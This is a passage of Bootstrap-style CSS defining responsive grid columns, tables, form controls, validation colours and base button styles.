            }

            .col-sm-1 {
                width: 8.33333333%;
            }

            .col-sm-2 {
                width: 16.66666667%;
            }

            .col-sm-3 {
                width: 25%;
            }

            .col-sm-4 {
                width: 33.33333333%;
            }

            .col-sm-5 {
                width: 41.66666667%;
            }

            .col-sm-6 {
                width: 50%;
            }

            .col-sm-7 {
                width: 58.33333333%;
            }

            .col-sm-8 {
                width: 66.66666667%;
            }

            .col-sm-9 {
                width: 75%;
            }

            .col-sm-10 {
                width: 83.33333333%;
            }

            .col-sm-11 {
                width: 91.66666667%;
            }

            .col-sm-12 {
                width: 100%;
            }

            .col-sm-pull-0 {
                right: auto;
            }

            .col-sm-pull-1 {
                right: 8.33333333%;
            }

            .col-sm-pull-2 {
                right: 16.66666667%;
            }

            .col-sm-pull-3 {
                right: 25%;
            }

            .col-sm-pull-4 {
                right: 33.33333333%;
            }

            .col-sm-pull-5 {
                right: 41.66666667%;
            }

            .col-sm-pull-6 {
                right: 50%;
            }

            .col-sm-pull-7 {
                right: 58.33333333%;
            }

            .col-sm-pull-8 {
                right: 66.66666667%;
            }

            .col-sm-pull-9 {
                right: 75%;
            }

            .col-sm-pull-10 {
                right: 83.33333333%;
            }

            .col-sm-pull-11 {
                right: 91.66666667%;
            }

            .col-sm-pull-12 {
                right: 100%;
            }

            .col-sm-push-0 {
                left: auto;
            }

            .col-sm-push-1 {
                left: 8.33333333%;
            }

            .col-sm-push-2 {
                left: 16.66666667%;
            }

            .col-sm-push-3 {
                left: 25%;
            }

            .col-sm-push-4 {
                left: 33.33333333%;
            }

            .col-sm-push-5 {
                left: 41.66666667%;
            }

            .col-sm-push-6 {
                left: 50%;
            }

            .col-sm-push-7 {
                left: 58.33333333%;
            }

            .col-sm-push-8 {
                left: 66.66666667%;
            }

            .col-sm-push-9 {
                left: 75%;
            }

            .col-sm-push-10 {
                left: 83.33333333%;
            }

            .col-sm-push-11 {
                left: 91.66666667%;
            }

            .col-sm-push-12 {
                left: 100%;
            }

            .col-sm-offset-0 {
                margin-left: 0%;
            }

            .col-sm-offset-1 {
                margin-left: 8.33333333%;
            }

            .col-sm-offset-2 {
                margin-left: 16.66666667%;
            }

            .col-sm-offset-3 {
                margin-left: 25%;
            }

            .col-sm-offset-4 {
                margin-left: 33.33333333%;
            }

            .col-sm-offset-5 {
                margin-left: 41.66666667%;
            }

            .col-sm-offset-6 {
                margin-left: 50%;
            }

            .col-sm-offset-7 {
                margin-left: 58.33333333%;
            }

            .col-sm-offset-8 {
                margin-left: 66.66666667%;
            }

            .col-sm-offset-9 {
                margin-left: 75%;
            }

            .col-sm-offset-10 {
                margin-left: 83.33333333%;
            }

            .col-sm-offset-11 {
                margin-left: 91.66666667%;
            }

            .col-sm-offset-12 {
                margin-left: 100%;
            }
        }

        @media (min-width: 992px) {

            .col-md-1,
            .col-md-2,
            .col-md-3,
            .col-md-4,
            .col-md-5,
            .col-md-6,
            .col-md-7,
            .col-md-8,
            .col-md-9,
            .col-md-10,
            .col-md-11,
            .col-md-12 {
                float: left;
            }

            .col-md-1 {
                width: 8.33333333%;
            }

            .col-md-2 {
                width: 16.66666667%;
            }

            .col-md-3 {
                width: 25%;
            }

            .col-md-4 {
                width: 33.33333333%;
            }

            .col-md-5 {
                width: 41.66666667%;
            }

            .col-md-6 {
                width: 50%;
            }

            .col-md-7 {
                width: 58.33333333%;
            }

            .col-md-8 {
                width: 66.66666667%;
            }

            .col-md-9 {
                width: 75%;
            }

            .col-md-10 {
                width: 83.33333333%;
            }

            .col-md-11 {
                width: 91.66666667%;
            }

            .col-md-12 {
                width: 100%;
            }

            .col-md-pull-0 {
                right: auto;
            }

            .col-md-pull-1 {
                right: 8.33333333%;
            }

            .col-md-pull-2 {
                right: 16.66666667%;
            }

            .col-md-pull-3 {
                right: 25%;
            }

            .col-md-pull-4 {
                right: 33.33333333%;
            }

            .col-md-pull-5 {
                right: 41.66666667%;
            }

            .col-md-pull-6 {
                right: 50%;
            }

            .col-md-pull-7 {
                right: 58.33333333%;
            }

            .col-md-pull-8 {
                right: 66.66666667%;
            }

            .col-md-pull-9 {
                right: 75%;
            }

            .col-md-pull-10 {
                right: 83.33333333%;
            }

            .col-md-pull-11 {
                right: 91.66666667%;
            }

            .col-md-pull-12 {
                right: 100%;
            }

            .col-md-push-0 {
                left: auto;
            }

            .col-md-push-1 {
                left: 8.33333333%;
            }

            .col-md-push-2 {
                left: 16.66666667%;
            }

            .col-md-push-3 {
                left: 25%;
            }

            .col-md-push-4 {
                left: 33.33333333%;
            }

            .col-md-push-5 {
                left: 41.66666667%;
            }

            .col-md-push-6 {
                left: 50%;
            }

            .col-md-push-7 {
                left: 58.33333333%;
            }

            .col-md-push-8 {
                left: 66.66666667%;
            }

            .col-md-push-9 {
                left: 75%;
            }

            .col-md-push-10 {
                left: 83.33333333%;
            }

            .col-md-push-11 {
                left: 91.66666667%;
            }

            .col-md-push-12 {
                left: 100%;
            }

            .col-md-offset-0 {
                margin-left: 0%;
            }

            .col-md-offset-1 {
                margin-left: 8.33333333%;
            }

            .col-md-offset-2 {
                margin-left: 16.66666667%;
            }

            .col-md-offset-3 {
                margin-left: 25%;
            }

            .col-md-offset-4 {
                margin-left: 33.33333333%;
            }

            .col-md-offset-5 {
                margin-left: 41.66666667%;
            }

            .col-md-offset-6 {
                margin-left: 50%;
            }

            .col-md-offset-7 {
                margin-left: 58.33333333%;
            }

            .col-md-offset-8 {
                margin-left: 66.66666667%;
            }

            .col-md-offset-9 {
                margin-left: 75%;
            }

            .col-md-offset-10 {
                margin-left: 83.33333333%;
            }

            .col-md-offset-11 {
                margin-left: 91.66666667%;
            }

            .col-md-offset-12 {
                margin-left: 100%;
            }
        }

        @media (min-width: 1200px) {

            .col-lg-1,
            .col-lg-2,
            .col-lg-3,
            .col-lg-4,
            .col-lg-5,
            .col-lg-6,
            .col-lg-7,
            .col-lg-8,
            .col-lg-9,
            .col-lg-10,
            .col-lg-11,
            .col-lg-12 {
                float: left;
            }

            .col-lg-1 {
                width: 8.33333333%;
            }

            .col-lg-2 {
                width: 16.66666667%;
            }

            .col-lg-3 {
                width: 25%;
            }

            .col-lg-4 {
                width: 33.33333333%;
            }

            .col-lg-5 {
                width: 41.66666667%;
            }

            .col-lg-6 {
                width: 50%;
            }

            .col-lg-7 {
                width: 58.33333333%;
            }

            .col-lg-8 {
                width: 66.66666667%;
            }

            .col-lg-9 {
                width: 75%;
            }

            .col-lg-10 {
                width: 83.33333333%;
            }

            .col-lg-11 {
                width: 91.66666667%;
            }

            .col-lg-12 {
                width: 100%;
            }

            .col-lg-pull-0 {
                right: auto;
            }

            .col-lg-pull-1 {
                right: 8.33333333%;
            }

            .col-lg-pull-2 {
                right: 16.66666667%;
            }

            .col-lg-pull-3 {
                right: 25%;
            }

            .col-lg-pull-4 {
                right: 33.33333333%;
            }

            .col-lg-pull-5 {
                right: 41.66666667%;
            }

            .col-lg-pull-6 {
                right: 50%;
            }

            .col-lg-pull-7 {
                right: 58.33333333%;
            }

            .col-lg-pull-8 {
                right: 66.66666667%;
            }

            .col-lg-pull-9 {
                right: 75%;
            }

            .col-lg-pull-10 {
                right: 83.33333333%;
            }

            .col-lg-pull-11 {
                right: 91.66666667%;
            }

            .col-lg-pull-12 {
                right: 100%;
            }

            .col-lg-push-0 {
                left: auto;
            }

            .col-lg-push-1 {
                left: 8.33333333%;
            }

            .col-lg-push-2 {
                left: 16.66666667%;
            }

            .col-lg-push-3 {
                left: 25%;
            }

            .col-lg-push-4 {
                left: 33.33333333%;
            }

            .col-lg-push-5 {
                left: 41.66666667%;
            }

            .col-lg-push-6 {
                left: 50%;
            }

            .col-lg-push-7 {
                left: 58.33333333%;
            }

            .col-lg-push-8 {
                left: 66.66666667%;
            }

            .col-lg-push-9 {
                left: 75%;
            }

            .col-lg-push-10 {
                left: 83.33333333%;
            }

            .col-lg-push-11 {
                left: 91.66666667%;
            }

            .col-lg-push-12 {
                left: 100%;
            }

            .col-lg-offset-0 {
                margin-left: 0%;
            }

            .col-lg-offset-1 {
                margin-left: 8.33333333%;
            }

            .col-lg-offset-2 {
                margin-left: 16.66666667%;
            }

            .col-lg-offset-3 {
                margin-left: 25%;
            }

            .col-lg-offset-4 {
                margin-left: 33.33333333%;
            }

            .col-lg-offset-5 {
                margin-left: 41.66666667%;
            }

            .col-lg-offset-6 {
                margin-left: 50%;
            }

            .col-lg-offset-7 {
                margin-left: 58.33333333%;
            }

            .col-lg-offset-8 {
                margin-left: 66.66666667%;
            }

            .col-lg-offset-9 {
                margin-left: 75%;
            }

            .col-lg-offset-10 {
                margin-left: 83.33333333%;
            }

            .col-lg-offset-11 {
                margin-left: 91.66666667%;
            }

            .col-lg-offset-12 {
                margin-left: 100%;
            }
        }

        table {
            background-color: transparent;
        }

        table col[class*="col-"] {
            position: static;
            display: table-column;
            float: none;
        }

        table td[class*="col-"],
        table th[class*="col-"] {
            position: static;
            display: table-cell;
            float: none;
        }

        caption {
            padding-top: 7px 7px;
            padding-bottom: 7px 7px;
            color: #777777;
            text-align: left;
        }

        th {
            text-align: left;
        }

        .table {
            width: 100%;
            max-width: 100%;
            margin-bottom: 20px;
        }

        .table>thead>tr>th,
        .table>thead>tr>td,
        .table>tbody>tr>th,
        .table>tbody>tr>td,
        .table>tfoot>tr>th,
        .table>tfoot>tr>td {
            padding: 7px 7px;
            line-height: 1.42857143;
            vertical-align: top;
            border-top: 1px solid #CCCCCC;
        }

        .table>thead>tr>th {
            vertical-align: bottom;
            border-bottom: 2px solid #CCCCCC;
        }

        .table>caption+thead>tr:first-child>th,
        .table>caption+thead>tr:first-child>td,
        .table>colgroup+thead>tr:first-child>th,
        .table>colgroup+thead>tr:first-child>td,
        .table>thead:first-child>tr:first-child>th,
        .table>thead:first-child>tr:first-child>td {
            border-top: 0;
        }

        .table>tbody+tbody {
            border-top: 2px solid #CCCCCC;
        }

        .table .table {
            background-color: #fff;
        }

        .table-condensed>thead>tr>th,
        .table-condensed>thead>tr>td,
        .table-condensed>tbody>tr>th,
        .table-condensed>tbody>tr>td,
        .table-condensed>tfoot>tr>th,
        .table-condensed>tfoot>tr>td {
            padding: 5px;
        }

        .table-bordered {
            border: 1px solid #CCCCCC;
        }

        .table-bordered>thead>tr>th,
        .table-bordered>thead>tr>td,
        .table-bordered>tbody>tr>th,
        .table-bordered>tbody>tr>td,
        .table-bordered>tfoot>tr>th,
        .table-bordered>tfoot>tr>td {
            border: 1px solid #CCCCCC;
        }

        .table-bordered>thead>tr>th,
        .table-bordered>thead>tr>td {
            border-bottom-width: 2px;
        }

        .table-striped>tbody>tr:nth-of-type(odd) {
            background-color: #E5E5E5;
        }

        .table-hover>tbody>tr:hover {
            background-color: #E5E5E5;
        }

        .table>thead>tr>td.active,
        .table>thead>tr>th.active,
        .table>thead>tr.active>td,
        .table>thead>tr.active>th,
        .table>tbody>tr>td.active,
        .table>tbody>tr>th.active,
        .table>tbody>tr.active>td,
        .table>tbody>tr.active>th,
        .table>tfoot>tr>td.active,
        .table>tfoot>tr>th.active,
        .table>tfoot>tr.active>td,
        .table>tfoot>tr.active>th {
            background-color: #E5E5E5;
        }

        .table-hover>tbody>tr>td.active:hover,
        .table-hover>tbody>tr>th.active:hover,
        .table-hover>tbody>tr.active:hover>td,
        .table-hover>tbody>tr:hover>.active,
        .table-hover>tbody>tr.active:hover>th {
            background-color: #d8d8d8;
        }

        .table>thead>tr>td.success,
        .table>thead>tr>th.success,
        .table>thead>tr.success>td,
        .table>thead>tr.success>th,
        .table>tbody>tr>td.success,
        .table>tbody>tr>th.success,
        .table>tbody>tr.success>td,
        .table>tbody>tr.success>th,
        .table>tfoot>tr>td.success,
        .table>tfoot>tr>th.success,
        .table>tfoot>tr.success>td,
        .table>tfoot>tr.success>th {
            background-color: #EDF7ED;
        }

        .table-hover>tbody>tr>td.success:hover,
        .table-hover>tbody>tr>th.success:hover,
        .table-hover>tbody>tr.success:hover>td,
        .table-hover>tbody>tr:hover>.success,
        .table-hover>tbody>tr.success:hover>th {
            background-color: #dbefdb;
        }

        .table>thead>tr>td.info,
        .table>thead>tr>th.info,
        .table>thead>tr.info>td,
        .table>thead>tr.info>th,
        .table>tbody>tr>td.info,
        .table>tbody>tr>th.info,
        .table>tbody>tr.info>td,
        .table>tbody>tr.info>th,
        .table>tfoot>tr>td.info,
        .table>tfoot>tr>th.info,
        .table>tfoot>tr.info>td,
        .table>tfoot>tr.info>th {
            background-color: #EBF4FB;
        }

        .table-hover>tbody>tr>td.info:hover,
        .table-hover>tbody>tr>th.info:hover,
        .table-hover>tbody>tr.info:hover>td,
        .table-hover>tbody>tr:hover>.info,
        .table-hover>tbody>tr.info:hover>th {
            background-color: #d6e8f7;
        }

        .table>thead>tr>td.warning,
        .table>thead>tr>th.warning,
        .table>thead>tr.warning>td,
        .table>thead>tr.warning>th,
        .table>tbody>tr>td.warning,
        .table>tbody>tr>th.warning,
        .table>tbody>tr.warning>td,
        .table>tbody>tr.warning>th,
        .table>tfoot>tr>td.warning,
        .table>tfoot>tr>th.warning,
        .table>tfoot>tr.warning>td,
        .table>tfoot>tr.warning>th {
            background-color: #FFFAE6;
        }

        .table-hover>tbody>tr>td.warning:hover,
        .table-hover>tbody>tr>th.warning:hover,
        .table-hover>tbody>tr.warning:hover>td,
        .table-hover>tbody>tr:hover>.warning,
        .table-hover>tbody>tr.warning:hover>th {
            background-color: #fff5cd;
        }

        .table>thead>tr>td.danger,
        .table>thead>tr>th.danger,
        .table>thead>tr.danger>td,
        .table>thead>tr.danger>th,
        .table>tbody>tr>td.danger,
        .table>tbody>tr>th.danger,
        .table>tbody>tr.danger>td,
        .table>tbody>tr.danger>th,
        .table>tfoot>tr>td.danger,
        .table>tfoot>tr>th.danger,
        .table>tfoot>tr.danger>td,
        .table>tfoot>tr.danger>th {
            background-color: #FAEBEB;
        }

        .table-hover>tbody>tr>td.danger:hover,
        .table-hover>tbody>tr>th.danger:hover,
        .table-hover>tbody>tr.danger:hover>td,
        .table-hover>tbody>tr:hover>.danger,
        .table-hover>tbody>tr.danger:hover>th {
            background-color: #f5d7d7;
        }

        .table-responsive {
            min-height: .01%;
            overflow-x: auto;
        }

        @media screen and (max-width: 767px) {
            .table-responsive {
                width: 100%;
                margin-bottom: 15px;
                overflow-y: hidden;
                -ms-overflow-style: -ms-autohiding-scrollbar;
                border: 1px solid #CCCCCC;
            }

            .table-responsive>.table {
                margin-bottom: 0;
            }

            .table-responsive>.table>thead>tr>th,
            .table-responsive>.table>thead>tr>td,
            .table-responsive>.table>tbody>tr>th,
            .table-responsive>.table>tbody>tr>td,
            .table-responsive>.table>tfoot>tr>th,
            .table-responsive>.table>tfoot>tr>td {
                white-space: nowrap;
            }

            .table-responsive>.table-bordered {
                border: 0;
            }

            .table-responsive>.table-bordered>thead>tr>th:first-child,
            .table-responsive>.table-bordered>thead>tr>td:first-child,
            .table-responsive>.table-bordered>tbody>tr>th:first-child,
            .table-responsive>.table-bordered>tbody>tr>td:first-child,
            .table-responsive>.table-bordered>tfoot>tr>th:first-child,
            .table-responsive>.table-bordered>tfoot>tr>td:first-child {
                border-left: 0;
            }

            .table-responsive>.table-bordered>thead>tr>th:last-child,
            .table-responsive>.table-bordered>thead>tr>td:last-child,
            .table-responsive>.table-bordered>tbody>tr>th:last-child,
            .table-responsive>.table-bordered>tbody>tr>td:last-child,
            .table-responsive>.table-bordered>tfoot>tr>th:last-child,
            .table-responsive>.table-bordered>tfoot>tr>td:last-child {
                border-right: 0;
            }

            .table-responsive>.table-bordered>tbody>tr:last-child>th,
            .table-responsive>.table-bordered>tbody>tr:last-child>td,
            .table-responsive>.table-bordered>tfoot>tr:last-child>th,
            .table-responsive>.table-bordered>tfoot>tr:last-child>td {
                border-bottom: 0;
            }
        }

        fieldset {
            min-width: 0;
            padding: 0;
            margin: 0;
            border: 0;
        }

        legend {
            display: block;
            width: 100%;
            padding: 0;
            margin-bottom: 20px;
            font-size: 21px;
            line-height: inherit;
            color: #666666;
            border: 0;
            border-bottom: 1px solid #E5E5E5;
        }

        label {
            display: inline-block;
            max-width: 100%;
            margin-bottom: 5px;
            font-weight: 700;
        }

        input[type="search"] {
            box-sizing: border-box;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        input[type="radio"],
        input[type="checkbox"] {
            margin: 4px 0 0;
            margin-top: 1px \9;
            line-height: normal;
        }

        input[type="radio"][disabled],
        input[type="radio"].disabled,
        fieldset[disabled] input[type="radio"],
        input[type="checkbox"][disabled],
        input[type="checkbox"].disabled,
        fieldset[disabled] input[type="checkbox"] {
            cursor: not-allowed;
        }

        input[type="file"] {
            display: block;
        }

        input[type="range"] {
            display: block;
            width: 100%;
        }

        select[multiple],
        select[size] {
            height: auto;
        }

        input[type="file"]:focus,
        input[type="radio"]:focus,
        input[type="checkbox"]:focus {
            outline: 5px auto -webkit-focus-ring-color;
            outline-offset: -2px;
        }

        output {
            display: block;
            padding-top: 7px;
            font-size: 14px;
            line-height: 1.42857143;
            color: #333333;
        }

        .form-control {
            display: block;
            width: 100%;
            height: 34px;
            padding: 6px 12px;
            font-size: 14px;
            line-height: 1.42857143;
            color: #333333;
            background-color: #fff;
            background-image: none;
            border: 1px solid #CCCCCC;
            border-radius: 4px;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
        }

        .form-control:focus {
            border-color: #3a98d8;
            outline: 0;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(58, 152, 216, 0.6);
        }

        .form-control::-moz-placeholder {
            color: #999999;
            opacity: 1;
        }

        .form-control:-ms-input-placeholder {
            color: #999999;
        }

        .form-control::-webkit-input-placeholder {
            color: #999999;
        }

        .form-control::-ms-expand {
            background-color: transparent;
            border: 0;
        }

        .form-control[disabled],
        .form-control[readonly],
        fieldset[disabled] .form-control {
            background-color: #E5E5E5;
            opacity: 1;
        }

        .form-control[disabled],
        fieldset[disabled] .form-control {
            cursor: not-allowed;
        }

        textarea.form-control {
            height: auto;
        }

        @media screen and (-webkit-min-device-pixel-ratio: 0) {

            input[type="date"].form-control,
            input[type="time"].form-control,
            input[type="datetime-local"].form-control,
            input[type="month"].form-control {
                line-height: 34px;
            }

            input[type="date"].input-sm,
            .input-group-sm>input.form-control[type="date"],
            .input-group-sm>input.input-group-addon[type="date"],
            .input-group-sm>.input-group-btn>input.btn[type="date"],
            .input-group-sm input[type="date"],
            input[type="time"].input-sm,
            .input-group-sm>input.form-control[type="time"],
            .input-group-sm>input.input-group-addon[type="time"],
            .input-group-sm>.input-group-btn>input.btn[type="time"],
            .input-group-sm input[type="time"],
            input[type="datetime-local"].input-sm,
            .input-group-sm>input.form-control[type="datetime-local"],
            .input-group-sm>input.input-group-addon[type="datetime-local"],
            .input-group-sm>.input-group-btn>input.btn[type="datetime-local"],
            .input-group-sm input[type="datetime-local"],
            input[type="month"].input-sm,
            .input-group-sm>input.form-control[type="month"],
            .input-group-sm>input.input-group-addon[type="month"],
            .input-group-sm>.input-group-btn>input.btn[type="month"],
            .input-group-sm input[type="month"] {
                line-height: 45px;
            }

            input[type="date"].input-lg,
            .input-group-lg>input.form-control[type="date"],
            .input-group-lg>input.input-group-addon[type="date"],
            .input-group-lg>.input-group-btn>input.btn[type="date"],
            .input-group-lg input[type="date"],
            input[type="time"].input-lg,
            .input-group-lg>input.form-control[type="time"],
            .input-group-lg>input.input-group-addon[type="time"],
            .input-group-lg>.input-group-btn>input.btn[type="time"],
            .input-group-lg input[type="time"],
            input[type="datetime-local"].input-lg,
            .input-group-lg>input.form-control[type="datetime-local"],
            .input-group-lg>input.input-group-addon[type="datetime-local"],
            .input-group-lg>.input-group-btn>input.btn[type="datetime-local"],
            .input-group-lg input[type="datetime-local"],
            input[type="month"].input-lg,
            .input-group-lg>input.form-control[type="month"],
            .input-group-lg>input.input-group-addon[type="month"],
            .input-group-lg>.input-group-btn>input.btn[type="month"],
            .input-group-lg input[type="month"] {
                line-height: 28px;
            }
        }

        .form-group {
            margin-bottom: 15px;
        }

        .radio,
        .checkbox {
            position: relative;
            display: block;
            margin-top: 10px;
            margin-bottom: 10px;
        }

        .radio.disabled label,
        fieldset[disabled] .radio label,
        .checkbox.disabled label,
        fieldset[disabled] .checkbox label {
            cursor: not-allowed;
        }

        .radio label,
        .checkbox label {
            min-height: 20px;
            padding-left: 20px;
            margin-bottom: 0;
            font-weight: 400;
            cursor: pointer;
        }

        .radio input[type="radio"],
        .radio-inline input[type="radio"],
        .checkbox input[type="checkbox"],
        .checkbox-inline input[type="checkbox"] {
            position: absolute;
            margin-top: 4px \9;
            margin-left: -20px;
        }

        .radio+.radio,
        .checkbox+.checkbox {
            margin-top: -5px;
        }

        .radio-inline,
        .checkbox-inline {
            position: relative;
            display: inline-block;
            padding-left: 20px;
            margin-bottom: 0;
            font-weight: 400;
            vertical-align: middle;
            cursor: pointer;
        }

        .radio-inline.disabled,
        fieldset[disabled] .radio-inline,
        .checkbox-inline.disabled,
        fieldset[disabled] .checkbox-inline {
            cursor: not-allowed;
        }

        .radio-inline+.radio-inline,
        .checkbox-inline+.checkbox-inline {
            margin-top: 0;
            margin-left: 10px;
        }

        .form-control-static {
            min-height: 34px;
            padding-top: 7px;
            padding-bottom: 7px;
            margin-bottom: 0;
        }

        .form-control-static.input-lg,
        .input-group-lg>.form-control-static.form-control,
        .input-group-lg>.form-control-static.input-group-addon,
        .input-group-lg>.input-group-btn>.form-control-static.btn,
        .form-control-static.input-sm,
        .input-group-sm>.form-control-static.form-control,
        .input-group-sm>.form-control-static.input-group-addon,
        .input-group-sm>.input-group-btn>.form-control-static.btn {
            padding-right: 0;
            padding-left: 0;
        }

        .input-sm,
        .input-group-sm>.form-control,
        .input-group-sm>.input-group-addon,
        .input-group-sm>.input-group-btn>.btn {
            height: 45px;
            padding: 5px 10px;
            font-size: 11px;
            line-height: 1.5;
            border-radius: 3px;
        }

        select.input-sm,
        .input-group-sm>select.form-control,
        .input-group-sm>select.input-group-addon,
        .input-group-sm>.input-group-btn>select.btn {
            height: 45px;
            line-height: 45px;
        }

        textarea.input-sm,
        .input-group-sm>textarea.form-control,
        .input-group-sm>textarea.input-group-addon,
        .input-group-sm>.input-group-btn>textarea.btn,
        select[multiple].input-sm,
        .input-group-sm>select.form-control[multiple],
        .input-group-sm>select.input-group-addon[multiple],
        .input-group-sm>.input-group-btn>select.btn[multiple] {
            height: auto;
        }

        .form-group-sm .form-control {
            height: 45px;
            padding: 5px 10px;
            font-size: 11px;
            line-height: 1.5;
            border-radius: 3px;
        }

        .form-group-sm select.form-control {
            height: 45px;
            line-height: 45px;
        }

        .form-group-sm textarea.form-control,
        .form-group-sm select[multiple].form-control {
            height: auto;
        }

        .form-group-sm .form-control-static {
            height: 45px;
            min-height: 31px;
            padding: 6px 10px;
            font-size: 11px;
            line-height: 1.5;
        }

        .input-lg,
        .input-group-lg>.form-control,
        .input-group-lg>.input-group-addon,
        .input-group-lg>.input-group-btn>.btn {
            height: 28px;
            padding: 10px 16px;
            font-size: 17px;
            line-height: 1.3333333;
            border-radius: 6px;
        }

        select.input-lg,
        .input-group-lg>select.form-control,
        .input-group-lg>select.input-group-addon,
        .input-group-lg>.input-group-btn>select.btn {
            height: 28px;
            line-height: 28px;
        }

        textarea.input-lg,
        .input-group-lg>textarea.form-control,
        .input-group-lg>textarea.input-group-addon,
        .input-group-lg>.input-group-btn>textarea.btn,
        select[multiple].input-lg,
        .input-group-lg>select.form-control[multiple],
        .input-group-lg>select.input-group-addon[multiple],
        .input-group-lg>.input-group-btn>select.btn[multiple] {
            height: auto;
        }

        .form-group-lg .form-control {
            height: 28px;
            padding: 10px 16px;
            font-size: 17px;
            line-height: 1.3333333;
            border-radius: 6px;
        }

        .form-group-lg select.form-control {
            height: 28px;
            line-height: 28px;
        }

        .form-group-lg textarea.form-control,
        .form-group-lg select[multiple].form-control {
            height: auto;
        }

        .form-group-lg .form-control-static {
            height: 28px;
            min-height: 37px;
            padding: 11px 16px;
            font-size: 17px;
            line-height: 1.3333333;
        }

        .has-feedback {
            position: relative;
        }

        .has-feedback .form-control {
            padding-right: 42.5px;
        }

        .form-control-feedback {
            position: absolute;
            top: 0;
            right: 0;
            z-index: 2;
            display: block;
            width: 34px;
            height: 34px;
            line-height: 34px;
            text-align: center;
            pointer-events: none;
        }

        .input-lg+.form-control-feedback,
        .input-group-lg>.form-control+.form-control-feedback,
        .input-group-lg>.input-group-addon+.form-control-feedback,
        .input-group-lg>.input-group-btn>.btn+.form-control-feedback,
        .input-group-lg+.form-control-feedback,
        .form-group-lg .form-control+.form-control-feedback {
            width: 28px;
            height: 28px;
            line-height: 28px;
        }

        .input-sm+.form-control-feedback,
        .input-group-sm>.form-control+.form-control-feedback,
        .input-group-sm>.input-group-addon+.form-control-feedback,
        .input-group-sm>.input-group-btn>.btn+.form-control-feedback,
        .input-group-sm+.form-control-feedback,
        .form-group-sm .form-control+.form-control-feedback {
            width: 45px;
            height: 45px;
            line-height: 45px;
        }

        .has-success .help-block,
        .has-success .control-label,
        .has-success .radio,
        .has-success .checkbox,
        .has-success .radio-inline,
        .has-success .checkbox-inline,
        .has-success.radio label,
        .has-success.checkbox label,
        .has-success.radio-inline label,
        .has-success.checkbox-inline label {
            color: #409020;
        }

        .has-success .form-control {
            border-color: #409020;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        }

        .has-success .form-control:focus {
            border-color: #2d6617;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #6bd541;
        }

        .has-success .input-group-addon {
            color: #409020;
            background-color: #EDF7ED;
            border-color: #409020;
        }

        .has-success .form-control-feedback {
            color: #409020;
        }

        .has-warning .help-block,
        .has-warning .control-label,
        .has-warning .radio,
        .has-warning .checkbox,
        .has-warning .radio-inline,
        .has-warning .checkbox-inline,
        .has-warning.radio label,
        .has-warning.checkbox label,
        .has-warning.radio-inline label,
        .has-warning.checkbox-inline label {
            color: #997A00;
        }

        .has-warning .form-control {
            border-color: #997A00;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        }

        .has-warning .form-control:focus {
            border-color: #665100;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ffcb00;
        }

        .has-warning .input-group-addon {
            color: #997A00;
            background-color: #FFFAE6;
            border-color: #997A00;
        }

        .has-warning .form-control-feedback {
            color: #997A00;
        }

        .has-error .help-block,
        .has-error .control-label,
        .has-error .radio,
        .has-error .checkbox,
        .has-error .radio-inline,
        .has-error .checkbox-inline,
        .has-error.radio label,
        .has-error.checkbox label,
        .has-error.radio-inline label,
        .has-error.checkbox-inline label {
            color: #d63636;
        }

        .has-error .form-control {
            border-color: #d63636;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        }

        .has-error .form-control:focus {
            border-color: #b42525;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #e78b8b;
        }

        .has-error .input-group-addon {
            color: #d63636;
            background-color: #FAEBEB;
            border-color: #d63636;
        }

        .has-error .form-control-feedback {
            color: #d63636;
        }

        .has-feedback label~.form-control-feedback {
            top: 25px;
        }

        .has-feedback label.sr-only~.form-control-feedback {
            top: 0;
        }

        .help-block {
            display: block;
            margin-top: 5px;
            margin-bottom: 10px;
            color: #737373;
        }

        @media (min-width: 768px) {
            .form-inline .form-group {
                display: inline-block;
                margin-bottom: 0;
                vertical-align: middle;
            }

            .form-inline .form-control {
                display: inline-block;
                width: auto;
                vertical-align: middle;
            }

            .form-inline .form-control-static {
                display: inline-block;
            }

            .form-inline .input-group {
                display: inline-table;
                vertical-align: middle;
            }

            .form-inline .input-group .input-group-addon,
            .form-inline .input-group .input-group-btn,
            .form-inline .input-group .form-control {
                width: auto;
            }

            .form-inline .input-group>.form-control {
                width: 100%;
            }

            .form-inline .control-label {
                margin-bottom: 0;
                vertical-align: middle;
            }

            .form-inline .radio,
            .form-inline .checkbox {
                display: inline-block;
                margin-top: 0;
                margin-bottom: 0;
                vertical-align: middle;
            }

            .form-inline .radio label,
            .form-inline .checkbox label {
                padding-left: 0;
            }

            .form-inline .radio input[type="radio"],
            .form-inline .checkbox input[type="checkbox"] {
                position: relative;
                margin-left: 0;
            }

            .form-inline .has-feedback .form-control-feedback {
                top: 0;
            }
        }

        .form-horizontal .radio,
        .form-horizontal .checkbox,
        .form-horizontal .radio-inline,
        .form-horizontal .checkbox-inline {
            padding-top: 7px;
            margin-top: 0;
            margin-bottom: 0;
        }

        .form-horizontal .radio,
        .form-horizontal .checkbox {
            min-height: 27px;
        }

        .form-horizontal .form-group {
            margin-right: -15px;
            margin-left: -15px;
        }

        .form-horizontal .form-group:before,
        .form-horizontal .form-group:after {
            display: table;
            content: " ";
        }

        .form-horizontal .form-group:after {
            clear: both;
        }

        @media (min-width: 768px) {
            .form-horizontal .control-label {
                padding-top: 7px;
                margin-bottom: 0;
                text-align: right;
            }
        }

        .form-horizontal .has-feedback .form-control-feedback {
            right: 15px;
        }

        @media (min-width: 768px) {
            .form-horizontal .form-group-lg .control-label {
                padding-top: 11px;
                font-size: 17px;
            }
        }

        @media (min-width: 768px) {
            .form-horizontal .form-group-sm .control-label {
                padding-top: 6px;
                font-size: 11px;
            }
        }

        .btn {
            display: inline-block;
            margin-bottom: 0;
            font-weight: normal;
            text-align: center;
            white-space: nowrap;
            vertical-align: middle;
            touch-action: manipulation;
            cursor: pointer;
            background-image: none;
            border: 1px solid transparent;
            padding: 6px 12px;
            font-size: 14px;
            line-height: 1.42857143;
            border-radius: 4px;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

